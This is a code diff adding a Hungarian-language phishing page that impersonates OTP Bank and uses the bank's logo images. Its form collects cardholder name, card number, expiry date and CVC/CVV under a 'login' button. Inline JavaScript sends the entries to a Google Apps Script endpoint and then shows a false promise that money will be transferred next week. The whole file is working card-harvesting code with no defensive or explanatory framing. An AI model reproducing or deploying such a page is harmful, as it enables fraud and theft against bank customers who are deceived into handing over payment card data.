@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>OTP Bank</title>
+    <link rel='icon' href='otp.png' />
+  
+    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">
+
+    <style>
+            
+  
+
+
+    
+
+    </style>
+
+
+</head>
+<body>
+    
+
+
+
+
+
+
+
+
+
+
+    <section class="vh-100">
+        <div class="container py-5 h-100" >
+          <div class="row d-flex justify-content-center align-items-center h-100" >
+            <div class="col-12 col-md-8 col-lg-6 col-xl-5">
+              <div class="card shadow-2-strong">
+                <div class="card-body p-5 text-center">
+      <img src="otp2.png" width="250px">
+
+                  <div class="form-outline mb-4">
+                    <form method="post" autocomplete="off" name="google-sheet">
+                        <div class="form-group">
+                            <input type="text" name="Nev" class="form-control" placeholder="Kártya Tulajdonos Neve" value="" required=""/>
+                        </div>
+                        <div class="form-group">
+                            <input type="text" name="Kartyaszam" class="form-control" placeholder="Kártyaszám" value="" required=""/>
+                        </div>
+                        <div class="form-group">
+                  
+            
+                            <div class="form-group">
+                                <input type="text" name="Datum" class="form-control" placeholder="Lejárati Dátum  *példa : 2023/05* " value="" required=""/>
+                            </div>
+                            <div class="form-group">
+
+
+                                <div class="form-group">
+                                    <input type="zip" name="CVC/CVV" class="form-control" placeholder="CVC/CVV" value="" required=""/>
+                                </div>
+                                <div class="form-group">
+                     
+                 
+                   <div>
+                    <button  class="btn btn-success" type="submit">Bejelentkezés</button>
+                   </div>
+                        </div>
+                    </form>
+
+
+
+
+
+                 
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+          <script>
+            const scriptURL = 'https://script.google.com/macros/s/AKfycbwUmh1WCd9TYTGnxDdUr0izxkka5MxZfpbJbk3oYm0gAjHNhWaH9YZmS8ssq5hB126y/exec'
+            const form = document.forms['google-sheet']
+          
+            form.addEventListener('submit', e => {
+              e.preventDefault()
+              fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+                .then(response => alert("Sikeresen rőgizettük jövőhéten utaljuk a pénzt."))
+                .catch(error => console.error('Error!', error.message))
+            })
+          </script>
+        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js" integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN" crossorigin="anonymous"></script>
+
+</body>
+</html>
